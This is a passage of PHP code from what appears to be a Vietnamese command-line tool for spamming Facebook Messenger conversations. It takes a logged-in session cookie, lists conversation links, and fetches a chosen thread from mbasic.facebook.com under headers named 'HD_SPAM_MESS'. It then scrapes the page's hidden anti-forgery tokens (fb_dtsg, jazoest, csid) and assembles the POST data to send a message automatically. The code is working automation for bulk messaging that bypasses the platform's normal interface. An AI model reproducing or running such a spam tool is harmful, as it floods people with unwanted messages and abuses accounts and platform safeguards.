    $getidlink = explode("#fua",$getinfo)[0];
    $aslink = "/messages/read/?".$getidlink;
    $k = fopen("idlink.txt","a");
    fwrite($k, $aslink."\n");
    fclose($k);
    }else{break;}
    
    
    }
    
    
    }else{echo "Cookie Die";exit;}

    while(true){
    echo "\033[1;91m[\033[1;92mâœ”\033[1;91m] \033[1;97m=>\033[1;92m HÃ£y nháº­p sá»‘ Ä‘á»ƒ chá»n:\033[1;93m ";
    $acc = trim(fgets(STDIN));
    if(is_numeric($acc)){
    $line = file("idlink.txt", FILE_IGNORE_NEW_LINES);
    //echo $line;
    $acc--;
    global $asslink;
    global $csid;
    $asslink = $line[$acc];
    break;}else{echo "Chá»‰ Nháº­p Sá»‘"."\n";}
    }

    $curl = curl_init();
    curl_setopt_array($curl, array(
    CURLOPT_PORT => "443",
    CURLOPT_URL => "https://mbasic.facebook.com".$asslink,
    CURLOPT_ENCODING => "",
    CURLOPT_RETURNTRANSFER => true,
    CURLOPT_CUSTOMREQUEST => "GET",
    CURLOPT_HTTPHEADER => $_SESSION['HD_SPAM_MESS']));
    $x = curl_exec($curl); curl_close($curl);
    for($t=1;$t<20;$t++){
    $d1 = explode(">",explode('<input type="hidden"',$x)[$t])[0];
    $getd = explode('"',explode('value="',$d1)[1])[0];
    if(str_contains($d1, "fb_dtsg")){$fb_dtsg=$getd;}
    if(str_contains($d1, "jazoest")){$jazoest=$getd;}
    if(str_contains($d1, "tids")){$tids=$getd;}
    if(str_contains($d1, "wwwupp")){$wwwupp=$getd;}
    if(str_contains($d1, "ids")){$ids=$getd;}
    if(str_contains($d1, "cver")){$cver=$getd;}
    if(str_contains($d1, "csid")){$csid=$getd;break;}
    //echo $t."/".$d1."\n";
    }

    $data = "fb_dtsg=".$fb_dtsg."&jazoest=".$jazoest."&body=<NDSEND>&send=Gá»­i&tids=".$tids."&wwwupp=".$wwwupp."&ids[".$ids."]=".$ids."&referrer=&ctype=&cver=".$cver."&csid=".$csid;
    return $data;
}
